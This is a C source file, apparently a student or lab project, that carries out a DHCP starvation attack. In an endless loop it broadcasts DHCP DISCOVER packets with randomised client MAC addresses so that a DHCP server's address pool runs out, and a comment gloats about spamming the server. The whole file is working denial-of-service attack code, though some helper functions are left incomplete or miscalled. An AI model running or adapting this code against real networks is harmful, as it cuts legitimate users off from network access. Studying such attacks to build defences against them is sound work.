#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<net/if.h> //Ifreq
#include<sys/ioctl.h> //Ifreq
#include<unistd.h> //sleep

#include "DHCP_starvation.h"

int debug = 1;


char interface[] = "enp0s3";

//Will be stored in dhcp struct as u_char dp_chaddr[16];
u_char client_hardware_address_nonpointer[16] = "";
u_char *client_hardware_address = client_hardware_address_nonpointer;


int main(int argc, char *argv[])
{
	//CREATE SOCKET
	int sockfd = create_socket();
	if (sockfd < 0) {
		printf("ERROR : SOCKET CREATION\n");
	};

	/*
	//SEND DHCP DISCOVERY MESSAGE --> BROADCAST
	if (dhcpdiscover(sockfd) != 0) {
		printf("ERROR : SEND DISCOVERY MESSAGE\n");
	};
	*/

	/*
	//WAIT FOR AN OFFER FROM THE DHCP AND INTERCEPT IT
	if (receive_offer(sockfd) != 0) {
		printf("ERROR : DHCP OFFER INTERCEPTION\n");
	}; */

	//HDCP STARVING --> SPAM (MWAHAHAHAA)
	send_packets(sockfd);

};



// Create socket, bind to myaddr and bind to the interface my_interface


int create_socket() {

	//Socket creation to get in touch with the DHCP and bind an address
	int sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	struct sockaddr_in src;
	memset(&src, 0, sizeof(src));
	src.sin_family = AF_INET;
	src.sin_port = htons(CLIENT_PORT);
	src.sin_addr.s_addr = INADDR_ANY; //0.0.0.0

	int flag = 1;
	setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,(char *)&flag,sizeof(flag));
	setsockopt(sockfd,SOL_SOCKET,SO_BROADCAST,(char *)&flag,sizeof(flag)); //ERROR : SEND DISCOVERY MESSAGE if not

	//Initialize the interface --> https://stackoverflow.com/questions/14478167/bind-socket-to-network-interface
		//And bind the socket to it
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), interface);
	memcpy(client_hardware_address,&ifr.ifr_hwaddr.sa_data,6); //Copy the client hardware address of interface
	if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (char *)&ifr, sizeof(ifr)) < 0) {
		printf("ERROR : BIND SOCKET TO INTERFACE\n");
	};


	bind(sockfd, (struct sockaddr *) &src, sizeof(struct sockaddr));
	return sockfd;
};





int dhcp_discover(int sockfd) {
	//FIRST STEP : SEND DHCP DISCOVERY MESSAGE --> BROADCAST
		// More info https://iponwire.com/dhcp-header-explained/
	struct dhcp_packet discovery_packet;
	memset(&discovery_packet, 0, sizeof(discovery_packet));
	discovery_packet.dp_op = 1; // 1 for request ; 2 for reply
	discovery_packet.dp_htype = 1; // 1 for Ethernet
	discovery_packet.dp_hlen = 6;
	discovery_packet.dp_hops = 0;
	discovery_packet.dp_xid = htonl(rand()); //The transaction id is random
	discovery_packet.dp_secs = htons(255);
	discovery_packet.dp_flags = htons(32768);

	//FILL THE OPTIONS FIELD --> Options mean in fact additional information
	/*When used with BOOTP, the first four octets of the vendor information
      field have been assigned to the "magic cookie" (as suggested in RFC
      951).  This field identifies the mode in which the succeeding data is
      to be interpreted.  The value of the magic cookie is the 4 octet
      dotted decimal 99.130.83.99 (or hexadecimal number 63.82.53.63) in
      network byte order.*/
		// More info --> https://datatracker.ietf.org/doc/html/rfc2132
	discovery_packet.dp_options[0] = '\x63';
	discovery_packet.dp_options[1] = '\x82';
	discovery_packet.dp_options[2] = '\x53';
	discovery_packet.dp_options[3] = '\x63';

	//DHCP message type is identified
	discovery_packet.dp_options[4] = 53;    // DHCP message type option identifier --> 53 is DHCP message type
	discovery_packet.dp_options[5] = '\x01';  // DHCP message option length in bytes
	discovery_packet.dp_options[6] = 1; //Message type++ --> 1 for a dhcp discovery
									// More info --> https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml

	//We have to create a random MAC address for each discovery packet,
	//otherwise, the dhcp will know all the packets are coming from the same client
	discovery_packet.dp_chaddr[0] = 111;
	discovery_packet.dp_chaddr[1] = 111; // The first two one are not random in order to recognize later our discovery packet
	for (int i = 2; i < 6 ; i++) {
		discovery_packet.dp_chaddr[i] = rand()%256;
	};

	struct sockaddr_in dest_broadcast; //Destination adresse (in broadcast mode)
	memset(&dest_broadcast,0,sizeof(dest_broadcast));
	dest_broadcast.sin_family = AF_INET;
	dest_broadcast.sin_port = htons(SERVER_PORT);
	dest_broadcast.sin_addr.s_addr = INADDR_BROADCAST; //255.255.255.255

	int sent_size = sendto(sockfd, (char *)&discovery_packet, sizeof(discovery_packet), 0,(struct sockaddr *) &dest_broadcast,sizeof(dest_broadcast));
	if (sent_size < 0) {
		return 1;
	};

	if (debug) print_packet(discovery_packet);
	printf("[Discovery Packet] Succesfully sent size : %d\n", sent_size);
	return 0;
};




int check_response(int sockfd) {


	struct dhcp_packet offer_packet;

	struct sockaddr_in from; // set "from" (DHCP)
	memset(&from,0,sizeof(from));
	socklen_t fromlen = sizeof(struct sockaddr);

	int incorrect_offer = 1;
	while (incorrect_offer) {
		int received_size = recvfrom(sockfd, &offer_packet, sizeof(offer_packet), 0, (struct sockaddr*) &from, &fromlen);

		if (debug) print_packet(offer_packet);

		/* We have to make sure the message is a OFFER + an offer for us */

		//Is it an offer ?
		if (offer_packet.dp_options[4] != 53 || offer_packet.dp_options[6] != 2) {
			continue;
		};

		//Ok it looks it is a DHCP offer. Is it for us ? --> Compare Client MAC address
		incorrect_offer = 0;
		for (int i = 0; i < 6; i++) {
			if (offer_packet.dp_chaddr[i] != client_hardware_address[i]) {
				incorrect_offer = 1;
			};
		};

	};

};

int send_packets(int sockfd) {
	printf("SPAMMING ...");
	int starve_count = 1;
	while (1) {
		printf("\nSTARVING COUNT : %d\n", starve_count++);
		printf("Sending packet...\n");
		dhcp_discover(sockfd);
		int k = usleep(100);
		printf( "%d", k);
		//printf("\nReceiving offer...\n");
		//receive_offer(sockfd);
	};
	return 0;
};


void print_packet(struct dhcp_packet packet) {
	printf("\n\n######### PRINT DHCP PACKET ########### \n\n");
	printf("Opcode tupe (op) : %d\n", packet.dp_op);
	printf("Hardware addr type (htype) : %d\n", packet.dp_htype);
	printf("Hardware addr lenght (hlen) : %d\n", packet.dp_hlen);
	printf("Gatewat hops (hops) : %d\n", packet.dp_hops);
	printf("Transaction ID (xID) : %lu\n", (unsigned long)packet.dp_xid);
	printf("Seconds since boot began ID (secs) : %lu\n", (unsigned long)packet.dp_secs);
	printf("Flags (flags) : %lu\n", (unsigned long)packet.dp_flags);
	printf("Client IP address (ciaddr):  %s\n",inet_ntoa(packet.dp_ciaddr));
	printf("Your IP address (yiaddr):  %s\n",inet_ntoa(packet.dp_yiaddr));
	printf("Server IP address (siaddr):  %s\n",inet_ntoa(packet.dp_siaddr));
	printf("Gateway IP address (giaddr):  %s\n",inet_ntoa(packet.dp_giaddr));
	printf("Client hardware address (chaddr):  %u\n",packet.dp_chaddr);
	printf("Server host name (sname):  %u\n",packet.dp_sname);
	printf("Boot file name (file):  %u\n",packet.dp_file);
	printf("Options (options):  %u\n",packet.dp_options);
	printf("\n\n");
};























///
